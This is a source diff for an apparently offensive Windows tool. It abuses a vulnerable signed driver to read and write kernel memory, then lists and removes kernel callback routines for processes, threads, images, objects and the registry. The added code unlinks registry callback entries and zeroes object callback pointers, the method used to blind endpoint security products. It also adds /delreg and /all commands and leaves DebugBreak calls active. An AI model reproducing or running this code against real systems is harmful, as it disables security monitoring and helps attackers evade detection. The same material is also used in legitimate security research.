@@ -8,7 +8,7 @@
 #include <cstdio>
 #include <iostream>
 
-//#define DEBUGGING_ON  1
+#define DEBUGGING_ON  1
 #define  KERNEL_MEMORY_START 0xFFFF000000000000
 
 
@@ -363,7 +363,7 @@ struct ObjectTypes getVersionPatterns() {
         return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48, 0xd40349c9ff02b70f };
      default:
         wprintf(L"[!] Version Patterns Not Found! %d\n", winVer);
-
+        exit(0);
     }
 
 }
@@ -384,10 +384,10 @@ struct ObjectTypes getVersionOffsets() {
     case 2004:
         return { (DWORD64)-0xC, (DWORD64)-0x7, (DWORD64)-0x4, (DWORD64)-0x19, (DWORD64)0x19 };
     case 2009: // Verified 20H2
-        return { (DWORD64)-0xC, (DWORD64)-0x7, (DWORD64)-0x4, (DWORD64)-0x19, (DWORD64)0x19 };
+        return { (DWORD64)-0xC, (DWORD64)-0x7, (DWORD64)-0x4, (DWORD64)-0x9, (DWORD64)0x19 };
     default:
         wprintf(L"[!] Version Offsets Not Found! %d\n", winVer);
-
+        exit(0);
     }
 
 }
@@ -404,7 +404,7 @@ HANDLE GetDriverHandle(){
     if (Device == INVALID_HANDLE_VALUE) {
         Log("[!] Unable to obtain a handle to the device object");
         return Device;
-        exit;
+        exit(1);
     }
     else {
         Log("[+] Device object handle obtained: %p", Device);
@@ -444,7 +444,7 @@ DWORD64 PatternSearch(HANDLE Device, DWORD64 start, DWORD64 end, DWORD64 pattern
  
     for (int i = 0; i < range; i++) {
         DWORD64 contents = ReadMemoryDWORD64(Device, start + i);
-        Debug("[-] %d : %p : %p", i, start + i, contents);
+        // Debug("[-] %d : %p : %p", i, start + i, contents);
         if (contents == pattern) {
             Debug("[*] GOLD JERRY GOLD: %p", start+i);
             Sleep(200);
@@ -462,7 +462,6 @@ void findregistrycallbackroutines(DWORD64 remove) {
     //At offset 0x28 is the address of the callback function.
 
 
-    PLIST_ENTRY pEntry;
     ObjectTypes patterns = getVersionPatterns(); // hardcoded
     ObjectTypes variableOffset = getVersionOffsets();
     
@@ -473,27 +472,31 @@ void findregistrycallbackroutines(DWORD64 remove) {
     DWORD offset = ReadMemoryDWORD(Device, patternaddress + variableOffset.registry);
     const DWORD64 callbacklisthead = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) + variableOffset.registry + sizeof(DWORD);
     Log("[+] Callbacklisthead: %p", callbacklisthead);
-    DWORD64 nextitem = ReadMemoryDWORD64(Device, callbacklisthead + 0x8);
+    DWORD64 thisItem = ReadMemoryDWORD64(Device, callbacklisthead + 0x8);
+    DWORD64 lastItem = callbacklisthead;
     int i = 0;
-
-    while (nextitem != callbacklisthead && i < 64) {
-        nextitem = ReadMemoryDWORD64(Device, nextitem + 0x8);
-        DWORD64 callback = ReadMemoryDWORD64(Device, ReadMemoryDWORD64(Device, nextitem) + 0x28);
-        DWORD64 address = ReadMemoryDWORD64(Device, nextitem) + 0x28;
+DebugBreak();
+    while (thisItem != callbacklisthead && i < 64) {
+        DWORD64 address = thisItem + 0x28;
+        DWORD64 callback = ReadMemoryDWORD64(Device, address);
+        Log("Callback %p at address %p", callback, address);
         FindDriver(callback);
-        /* Removing this functionality for now. Writing to this structure seems to trigger patchguard. Need to find a way around it.
+        /* Removing this functionality for now. Writing to this structure seems to trigger patchguard. Need to find a way around it.*/
+        DWORD64 flink = ReadMemoryDWORD64(Device, thisItem + 0x8);
         if (callback == remove) {
-            Log("Removing callback to %p at address %p", callback, address);
-            //WriteMemoryDWORD64(Device, address, 0x0000000000000000);
-        }*/
+            Log("Removing...");
+            WriteMemoryDWORD64(Device, lastItem + 0x8, flink); // last.flink to next
+            WriteMemoryDWORD64(Device, flink, lastItem); // next.blink to last
+        }
         i++;
+        lastItem = thisItem;
+        thisItem = flink;
     }
 
 }
 
 void findobjcallbackroutine(DWORD64 remove) {
     
-    PLIST_ENTRY pEntry;
     ObjectTypes patterns = getVersionPatterns(); // hardcoded
     ObjectTypes variableOffset = getVersionOffsets();
     const auto Device = GetDriverHandle(); // vulnerable signed driver
@@ -523,21 +526,22 @@ void findobjcallbackroutine(DWORD64 remove) {
 
        DWORD lowerAddress = (DWORD)patternaddress + offset + (DWORD)variableOffset.object + sizeof(DWORD);
        DWORD64 upperAddress = ((patternaddress) >> 32) << 32;
-       const DWORD64 objectDirectory = upperAddress + lowerAddress;
+       const DWORD64 objectDirectoryAddress = upperAddress + lowerAddress;
        Debug("[+] lowerAddress      : %p", lowerAddress);
        Debug("[+] upperAddress      : %p", upperAddress);
 
-        Debug("[+] objectDirectory      : %p", objectDirectory);
+        Debug("[+] objectDirectory pointer: %p", objectDirectoryAddress);
  
-        DWORD64 objectDirectoryEntryAddress = ReadMemoryDWORD64(Device, objectDirectory );
-        Debug("[+] objectDirectoryEntryAddress (array) : %p", objectDirectoryEntryAddress);
-        DWORD64 firstObjectDirectoryEntry = objectDirectoryEntryAddress;
+        DWORD64 objectDirectory = ReadMemoryDWORD64(Device, objectDirectoryAddress );
+        Debug("[+] objectDirectory (array) : %p", objectDirectory);
+        DWORD64 objectDirectoryEntryAddress;
 
         Log("[+] Enumerating object callbacks");
         // there only 37 slots to store callbacks
         for (int i = 0; i < 37; i++) {
-            objectDirectoryEntryAddress =  firstObjectDirectoryEntry + (i* 0x8);
-            Debug("[+] array lookup : %d : %p", i, objectDirectoryEntryAddress);
+            objectDirectoryEntryAddress =  objectDirectory + (i* 0x8);
+            Debug("                                           ");
+            Debug("[+] Array lookup : %d : %p", i, objectDirectoryEntryAddress);
             
 
             if (objectDirectoryEntryAddress) {
@@ -546,12 +550,12 @@ void findobjcallbackroutine(DWORD64 remove) {
                 
 
                 while (objectDirectoryEntry) {
-                    Debug("[*]While Loop -----------------");
+                    Debug("[***] While Loop -----------------");
                     
 
                     DWORD64 objectTypeAddress = objectDirectoryEntry +0x8; //ObjectDirectoryEntry->ObjectType
                     DWORD64 objectType = ReadMemoryDWORD64(Device, objectTypeAddress);
-                    Debug("[+] objectType              (%p): %p", objectTypeAddress, objectType);
+                    Debug("[+++] objectType              (%p): %p", objectTypeAddress, objectType);
                     
 
                     DWORD64 objectTypeNameAddress = objectType + 0x18;
@@ -559,74 +563,66 @@ void findobjcallbackroutine(DWORD64 remove) {
 
                     DWORD64 objNameAddress = ReadMemoryDWORD64(Device, objectTypeNameAddress);
                     WORD size = ReadStringW(Device, objNameAddress, objectName);
-                    Debug("[+] objectName[%d]          (%p): %ls",size, objNameAddress, objectName);
-                    Debug("[+] Object Name : %ls", objectName);
+                    Debug("[+++] objectName[%d]          (%p): %ls",size, objNameAddress, objectName);
                   
 
-                    if (  wcscmp(objectName, L"Process") == 0
-                       || wcscmp(objectName, L"Thread")  == 0
-                       || wcscmp(objectName, L"Desktop") == 0) {
-                        // It is not a Process, Thread ot Desktop Callback
-                        DWORD64 ObjectCallbackEntryAddress = objectType + 0xC8;
-                        DWORD64  ObjectCallbackEntry = ReadMemoryDWORD64(Device, ObjectCallbackEntryAddress);
-                        Debug("[+]  ObjectCallbackEntry    (%p): %p", ObjectCallbackEntryAddress, ObjectCallbackEntry);
-                        
-                        if (ObjectCallbackEntry) {
-                            do {
-                                Debug("[*]Do Loop -----------------");
-                                
+                    // if (  wcscmp(objectName, L"Process") == 0
+                    //    || wcscmp(objectName, L"Thread")  == 0
+                    //    || wcscmp(objectName, L"Desktop") == 0) {
+                    // It is a Process, Thread ot Desktop Callback
+                    DWORD64 ObjectCallbackEntryAddress = objectType + 0xC8;
+                    DWORD64  ObjectCallbackEntry = ReadMemoryDWORD64(Device, ObjectCallbackEntryAddress);
+                    Debug("[+++]  ObjectCallbackEntry    (%p): %p", ObjectCallbackEntryAddress, ObjectCallbackEntry);
 
-                                ULONG ObjectCallbackEntryActive =  ReadMemoryDWORD(Device, ObjectCallbackEntry + 0x14);
-                                Debug("[+]  ObjectCallbackEntryActive  : %d", ObjectCallbackEntryActive);
-                             
+                    while (ObjectCallbackEntry != ObjectCallbackEntryAddress)
+                    {
+                      Debug("[******] While Loop -----------------");
 
-                                if (ObjectCallbackEntryActive && objectType) {
-
-                                    DWORD64 preOpAddress = ObjectCallbackEntry + 0x28;
-                                    DWORD64 preOp = ReadMemoryDWORD64(Device, preOpAddress);
-                                    Debug("[+] preOp       (%p) : %p", preOpAddress, preOp);
-                                    
-                                    if (preOp) {
-                                        if (remove && (remove == preOp)) {
-                                            WriteMemoryDWORD64(Device, preOpAddress, 0x0);
-                                        }
-                                        else {
-                                            FindDriver(preOp);
-                                        }
+                      ULONG ObjectCallbackEntryActive =  ReadMemoryDWORD(Device, ObjectCallbackEntry + 0x14);
+                      Debug("[++++++]  ObjectCallbackEntryActive  : %d", ObjectCallbackEntryActive);
 
 
-                                    }
+                      if (ObjectCallbackEntryActive == 1 && objectType) {
+                        Log("[[[[[[[[[[[[[[[[[[[[[[[[[");
+                        DWORD64 preOpAddress = ObjectCallbackEntry + 0x28;
+                        DWORD64 preOp = ReadMemoryDWORD64(Device, preOpAddress);
+                        Debug("[+++++++++] preOp       (%p) : %p", preOpAddress, preOp);
 
-                                 
-                                    DWORD64 postOpAddress = ObjectCallbackEntry + 0x30;
-                                    DWORD64 postOp = ReadMemoryDWORD64(Device, postOpAddress);
-                                    Debug("[+] postOp       (%p) : %p", postOpAddress, postOp);
-                                   
-                                    if (remove && (remove == postOp)) {
-                                        WriteMemoryDWORD64(Device, postOpAddress, 0x0);
-                                    }
-                                    else {
-                                        FindDriver(postOp);
-                                    }
-                                    
-
-                                }//end if
-
-                                ObjectCallbackEntryAddress = ReadMemoryDWORD64(Device, ObjectCallbackEntry);
-                                Debug("[+] ObjectCallbackEntry->CallbackList.Flink  : %p ", ObjectCallbackEntryAddress);
-                                Debug("[+] ObjectCallbackEntry                      : %p ", ObjectCallbackEntry);
-                                Debug("[+] objectType + 0xC8                        : %p ", objectType + 0xC8);
+                        if (preOp) {
+                          if (remove && (remove == preOp)) {
+                            WriteMemoryDWORD64(Device, preOpAddress, 0x0);
+                          }
+                          else {
+                            FindDriver(preOp);
+                          }
 
 
-                            } while (ObjectCallbackEntryAddress != (objectType + 0xC8));
-                        }//end if
-                    }//end if {objectName}
+                        }
 
-                    objectDirectoryEntryAddress = ReadMemoryDWORD64(Device, objectDirectoryEntry); //ObjectDirectoryEntry->ChainLink 
-                    objectDirectoryEntry = ReadMemoryDWORD64(Device, objectDirectoryEntryAddress);
-                    Debug("[+] objectDirectoryEntry    (%p) : %p", objectDirectoryEntryAddress, objectDirectoryEntry);
-                    Debug("[*] Chianlink hit");
-                   
+
+                        DWORD64 postOpAddress = ObjectCallbackEntry + 0x30;
+                        DWORD64 postOp = ReadMemoryDWORD64(Device, postOpAddress);
+                        Debug("[+++++++++] postOp       (%p) : %p", postOpAddress, postOp);
+
+                        if (remove && (remove == postOp)) {
+                          WriteMemoryDWORD64(Device, postOpAddress, 0x0);
+                        }
+                        else {
+                          FindDriver(postOp);
+                        }
+
+                        Log("]]]]]]]]]]]]]]]]]]]]]]]]]]]]");
+
+                      }//end if
+
+                      ObjectCallbackEntry = ReadMemoryDWORD64(Device, ObjectCallbackEntry);
+                      Debug("[++++++] ObjectCallbackEntry->CallbackList.Flink  : %p ", ObjectCallbackEntry);
+                    }
+
+                    objectDirectoryEntryAddress = objectDirectoryEntry;
+                    objectDirectoryEntry = ReadMemoryDWORD64(Device, objectDirectoryEntryAddress); //ObjectDirectoryEntry->ChainLink 
+                    Debug("[+++] objectDirectoryEntry    (%p) : %p", objectDirectoryEntryAddress, objectDirectoryEntry);
+                    Debug("[***] Chianlink hit");
                 }//end while
             }//end if
         }//end for
@@ -735,6 +731,14 @@ void findprocesscallbackroutine(DWORD64 remove) {
 
 
 int main(int argc, char* argv[]) {
+  DebugBreak();
+
+  /*
+bool pause = true;
+while (pause) {
+  Sleep(1000);
+}
+*/
     
     if (argc < 2) {
         printf("Usage: %s\n"
@@ -749,6 +753,7 @@ int main(int argc, char* argv[]) {
             " /obj - List Object Load Callbacks\n"
             " /delobj <address> - Remove Object Load Callback\n"
             " /reg - List Registry modification callbacks\n"
+            " /all - List each\n"
             , argv[0]);
         return 0;
     }
@@ -807,7 +812,18 @@ int main(int argc, char* argv[]) {
         findobjcallbackroutine((DWORD64)remove);
     }
     else if (strcmp(argv[1] + 1, "reg") == 0) {
-        
+        findregistrycallbackroutines(NULL);
+    }
+    else if (strcmp(argv[1] + 1, "delreg") == 0 && argc == 3) {
+        DWORD64 remove;
+        remove = strtoull(argv[2], NULL, 16);
+        findregistrycallbackroutines((DWORD64)remove);
+    }
+    else if (strcmp(argv[1] + 1, "all") == 0) {
+        findimgcallbackroutine(NULL);
+        findprocesscallbackroutine(NULL);
+        findthreadcallbackroutine(NULL);
+        findobjcallbackroutine(NULL);
         findregistrycallbackroutines(NULL);
     }
     else {
